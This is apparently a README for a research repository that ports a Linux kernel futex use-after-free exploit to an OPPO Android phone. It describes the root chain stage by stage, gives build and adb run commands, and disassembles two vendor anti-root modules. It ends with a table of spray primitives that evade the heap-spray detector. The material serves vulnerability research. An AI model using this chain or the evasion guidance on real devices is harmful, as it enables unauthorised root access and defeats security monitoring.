# GhostLock — OPPO Find X5 Pro (PFEM10) — OPlus Watchdog & Heap-Spray Detector

GhostLock (CVE-2026-43499) port for the OPPO Find X5 Pro on ColorOS 16. Reaches a `uid=0` child process and a loaded `kernelsu.ko`; the root process is intercepted before it can be used. The main content here is the disassembly of the two interception layers.

## Vulnerability

**CVE-2026-43499** — Futex PI (Priority Inheritance) Use-After-Free.

`remove_waiter()` clears `current->pi_blocked_on` when `current` is the *requeuer* rather than the waiter, on the `-EDEADLK` rollback path of `rt_mutex_start_proxy_lock()`. The waiter is left pointing into a popped stack frame.

Unpatched on this device: `remove_waiter` at `0xffffffc0081ed254`, pre-fix shape.

## Device

| Field | Value |
|-------|-------|
| Device | OPPO Find X5 Pro (PFEM10) |
| SoC | SM8450 (waipio) / Adreno 730 |
| OS | ColorOS 16.0.3.520 (CN01) |
| Kernel | `5.10.236-android12-9-o-gaf2075ad2c06` |
| Bootloader | locked, green |
| VA_BITS | 39 (`KIMAGE_TEXT_BASE = 0xffffffc008000000`) |

## Status

| Stage | Result |
|-------|--------|
| Compact waiter trigger (`CMP_REQUEUE_PI` → `EDEADLK`) | works |
| `task_struct` leak (perf) | works |
| PI write primitive (8-byte; value = `0` or a valid kernel address) | works |
| `task+0x778` / `task+0x780` writes land, target shows `Uid=root` | works |
| `kernelsu.ko` loaded (`Live` in `/proc/modules`) | works |
| Root process survives | **no** |
| Path A (UMH / `modprobe_path`) | unavailable — `CONFIG_STATIC_USERMODEHELPER_PATH=""` |

`kernelsu.ko` is a KMI `android12-5.10` module. Its `5.10.252-dirty` vermagic is the upstream build kernel and does not prevent loading: the module's `__versions` section is empty, so `same_magic()` compares only the fields after the first space.

## Exploit Flow

```
LT#2        leak target task_struct (perf) → file
W7 stage 1  write task+0x778 = init_cred alias   → target shows "Uid=root"
W7 stage 2  write task+0x780 = init_cred alias
W7 stage 3  zero-write init_cred+8 (refcount fix)
exec        memfd_exec("ksud late-load")         → kernelsu ... Live
```

### Stage 1 — task leak

`perf_event_open` with `PERF_TYPE_SOFTWARE` / `PERF_COUNT_SW_CPU_CLOCK`, `PERF_SAMPLE_REGS_INTR` (all 32 GPRs), `exclude_user=1`. The most-voted direct-map pointer across samples is the calling task's `task_struct`.

```
perf_event_paranoid = -1        # unprivileged on this device
accept range: [0xffffff8400000000, 0xffffff90000000)
reject if votes < 15% of samples
```

An out-of-range value that passed the lower bound has previously driven a zero-write into the kernel image → reboot.

### Stage 2 — the write

`run_w7()` writes `task + V12_W7_OFF`. `target_task` is read from a plain-text file (arithmetic base + range check only), so a compile-time constant can be substituted.

Writing `task->cred` and `task->real_cred` to the `init_cred` physmap alias yields full capabilities and `uid=0`.

## Watchdog — `oplus_security_guard.ko`

Vendor module, not in vmlinux. `.text` 0xfe0, `.data..ro_after_init` 1 byte.

### Per-task credential cache

`oplus_root_check_pre_handler` runs on `sys_enter` and caches four IDs plus the syscall number inside `task_struct`:

| Field | Offset |
|-------|--------|
| `syscallno` | `task+0xdf8` |
| `uid` | `task+0xe00` |
| `euid` | `task+0xe08` |
| `gid` | `task+0xe10` |
| `egid` | `task+0xe18` |

```asm
ldrsw x8, [x1, #0x118]      ; regs->syscallno
mrs   x9, sp_el0            ; current
ldr   x10, [x9, #0x780]     ; current->cred
str   x8,  [x9, #0xdf8]
ldr   w8,  [x10, #4]  ; cred->uid   → str x8, [x9, #0xe00]
ldr   w8,  [x10, #0x14] ; cred->euid → str x8, [x9, #0xe08]
ldr   w8,  [x10, #8]  ; cred->gid   → str x8, [x9, #0xe10]
ldr   w8,  [x10, #0x18] ; cred->egid → str x8, [x9, #0xe18]
```

### Kill condition

`oplus_root_check_post_handler` on `sys_exit`. Only `uid` / `euid` / `gid` / `egid` are compared — capabilities are never read.

```asm
ldr   x0,  [x8, #0xe00]       ; cached uid
cbz   x0, #0x48c              ; cached uid == 0 → return
adrp  x9, #0 ; ldrb w9, [x9]  ; g_boot_state
tbnz  w9, #0, #0x48c          ; is_unlocked → return
ldr   x9,  [x8, #0x780]       ; cred
ldr   w3,  [x8, #0xdf8]       ; cached syscallno
cmp   x0, w10 ; b.hi #0x468   ; uid descending → kill path
...                           ; euid / gid / egid, same shape
```

```asm
oplus_root_check_succ   ; printk + kevent_send_to_user   (report)
oplus_root_killed       ; printk + do_exit(SIGKILL)      (calling task only; no panic)
```

`g_boot_state` is a 1-byte `.data..ro_after_init` value derived at module init from the `verified_bootstate` symbol via `strstr`. `is_unlocked()` is a bare `LDRB` + `RET`.

Writing the module VA faults (`CONFIG_STRICT_MODULE_RWX=y`); a write must go to the physmap alias (`0xffffff80…`).

The report payload contains `$$sys_call_number@@%d`, `$$set_id_flag@@%d`, `$$addr_limit@@%lx`, `$$enforce@@%d`.

### Exempt syscalls

The kill path dispatches through a 72-entry jump table in `.rodata` covering syscall numbers 143–214. Twelve entries return without killing:

| Nr | Syscall | Nr | Syscall |
|----|---------|----|---------|
| 143 | `setgid` | 147 | `getresuid` |
| 144 | `setreuid` | 149 | `getresgid` |
| 145 | `setuid` | 203 | `getsockname` |
| 146 | `setresuid` | 204 | `getpeername` |
| 208 | `getsockopt` | 210 | `sendmsg` |
| 213 | `brk` | 214 | `munmap` |

The remaining 60 entries report and kill. A legitimate `setresuid(0,0,0)` is tolerated; an in-place `cred` overwrite is not, because it happens under a syscall that is not on the list.

### `task+8` is `thread_info.addr_limit`

Last gate before the dispatch table:

```asm
0x454: ldr   x9, [x8, #8]
0x458: mov   x10, #1
0x45c: movk  x10, #0x80, lsl #32    ; 0x8000000001
0x460: cmp   x9, x10
0x464: b.lo  #0x48c                 ; below TASK_SIZE+1 → return
```

`thread_info` on this build is `{ flags@0x0, addr_limit@0x8, ttbr0@0x10, preempt_count@0x18 }` (`CONFIG_SET_FS=y`). The constant is `USER_DS = TASK_SIZE - 1 = 0x7fffffffff` for VA_BITS=39, so the handler returns early unless `addr_limit == KERNEL_DS`.

Offset evidence: `el1_sync+0x40` (`kernel_entry`) saves it to `pt_regs.orig_addr_limit` (`sp+0x120`) and replaces it with `USER_DS`; the `set_fs()` family — `copy_{to,from}_user_nofault`, `strn{cpy,len}_user_nofault` — writes `[current+8]`; the module's own report payload carries `$$addr_limit@@%lx$$`.

## Heap-Spray Detector — `oplus_secure_harden.ko`

Five kretprobes. The variable names are misleading; the hooked functions are resolved by name at runtime:

| kretprobe variable | Hooks | Filter |
|---|---|---|
| `socket_kretprobe` | `ip_setsockopt` | `regs[1]` ∈ {41, 42, 48} |
| `socket_ip6_kretprobe` | `do_ipv6_setsockopt` | `regs[1]` ∈ {41, 42} |
| `cpuinfo_kretprobe` | `cpuinfo_open` | none |
| `setxattr_kretprobe` | `setxattr` | none |
| `sepolicy_reload_kretprobe` | `spolicy_reload` | none |

```asm
; entry_handler_socket
ldr  w8, [x1, #8]      ; regs[1] — 2nd argument of the hooked function
cmp  w8, #0x29         ; 41 IP_MSFILTER
b.eq  -> report
cmp  w8, #0x30         ; 48 MCAST_MSFILTER
b.eq  -> report
cmp  w8, #0x2a         ; 42 MCAST_JOIN_GROUP
b.ne #0xd68            ; anything else → return: no call, no counter
bl   oplus_heapspray_check
```

41 / 42 / 48 are `IP_MSFILTER` / `MCAST_JOIN_GROUP` / `MCAST_MSFILTER`, matching the module's own error strings (`Detected the MCAST_JOIN_GROUP_IP4 may be abnormal…`).

`oplus_heapspray_check` holds four counters (`heapspary_ip4`, `heapspary_ip6`, `heapspary_xttr`, `heapspary_cpuinfo`), calls `ktime_get_real_ts64` for a time-delta test, has seven report sites (`snprintf` + `printk` + `kevent_send_to_user`), and is itself gated on `verified_bootstate`.

Two caveats: the name-table → kretprobe-struct mapping is inferred from names; and on `ip_setsockopt(sk, level, optname, …)` the second argument is `level`, not `optname` (and `41 == SOL_IPV6`). Which syscall and which argument are therefore not fully resolved.

### Avoidance

| Primitive | Note |
|---|---|
| `setsockopt` optname 46 (`MCAST_JOIN_SOURCE_GROUP`) | falls through `b.ne` if the filter reads `optname` |
| `setsockopt` with level `SOL_IPV6` (41) | avoid if the filter reads `level` |
| `setxattr` | always counted |
| `/proc/cpuinfo` | always counted |
| `socket()` / `socketpair()` | not in the name table |
| `sendmsg`, `pipe`, `memfd`, `add_key`, `io_uring`, page faults | not in the name table |

A mass `socket()` spray does not trip this detector.

## Config (relevant)

```
CONFIG_CFI_CLANG=y
CONFIG_PTR_AUTH=y
CONFIG_SHADOW_CALL_STACK=y
CONFIG_STRICT_MODULE_RWX=y
CONFIG_STATIC_USERMODEHELPER=y
CONFIG_STATIC_USERMODEHELPER_PATH=""
CONFIG_SET_FS=y
CONFIG_RANDOMIZE_BASE=y
CONFIG_RANDOMIZE_MODULE_REGION_FULL=n
CONFIG_UNMAP_KERNEL_AT_EL0=y
CONFIG_ARM64_VA_BITS=39
CONFIG_ARM64_SW_TTBR0_PAN=y
CONFIG_SLAB_FREELIST_RANDOM=y
CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y
CONFIG_RANDOM_KMALLOC_CACHES=n
CONFIG_USER_NS=n
CONFIG_NF_TABLES=n
CONFIG_SYSVIPC=n
CONFIG_ANDROID_BINDER_IPC=y
CONFIG_KASAN=y
```

`perf_event_paranoid = -1` at runtime.

## Build

```bash
NDK=/path/to/android-ndk
"$NDK/toolchains/llvm/prebuilt/windows-x86_64/bin/aarch64-linux-android31-clang" \
  -O2 -Isrc/core -Isrc/devices/pfem10 -o exploit_guard src/core/exploit.c
```

## Setup

```bash
adb push exploit_guard /data/local/tmp/e
adb shell chmod 755 /data/local/tmp/e
adb shell /data/local/tmp/e
```

## Repository layout

```
ghostlock-pfem10/
├── modules/                          vendor modules + KernelSU, as pulled from the device
│   ├── oplus_security_guard.ko       watchdog (ROOTGUARD)
│   ├── oplus_secure_harden.ko        heap-spray detector
│   ├── oplus_security_keventupload.ko
│   ├── oplus_secure_common.ko
│   ├── kernelsu.ko                   vermagic=5.10.252-dirty
│   ├── ksud
│   └── libkernelsu.so
├── src/
│   ├── core/
│   │   ├── exploit.c                 trigger, pselect route, PI write (run_w7), cred stage
│   │   ├── payload.c                 spray payload, KernelSnitch, slab drain
│   │   ├── payload.h
│   │   └── fdset_map.h               pselect stack_fds layout map
│   └── devices/pfem10/
│       └── pfem10_target.h           per-device offsets (STRUCT_OFFSETS_5_10, physmap aliases)
├── tools/
│   ├── kdis.py                       disassemble the kernel Image (capstone + kallsyms)
│   ├── kdis_ko.py                    disassemble .ko modules, with relocation annotation
│   ├── find_task_off.py              enumerate all [current+off] readers/writers in the Image
│   └── slide_resolve.py              majority-vote slide resolver from sampled kernel IPs
├── artifacts/
│   ├── guard_disasm.txt              guard handlers, disassembled
│   ├── guard_exempt_table.txt        the 72-entry kill-path jump table, decoded
│   └── harden_disasm.txt             the five kretprobe entry handlers
├── NOTICE.md
└── README.md
```

`tools/kdis_ko.py` matches RELA sections by `sh_info`, not by name. On these builds the `.text` relocations live in an oddly-named section (`.rela.text.<function_name>`), so a name-based lookup returns zero entries and `bl` targets appear unresolved.

## Related

| Project | Relevance |
|---|---|
| [JoinChang/ghostlock-oneplus](https://github.com/JoinChang/ghostlock-oneplus) | reference implementation; 5.10 compact-waiter support |
| [issue #31](https://github.com/JoinChang/ghostlock-oneplus/issues/31) | OPPO Reno10 Pro+ (CPH2521), SM8475, 5.10.236 |
| [NebuSec CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) | original GhostLock research |

## License

For authorized security research and educational purposes only.
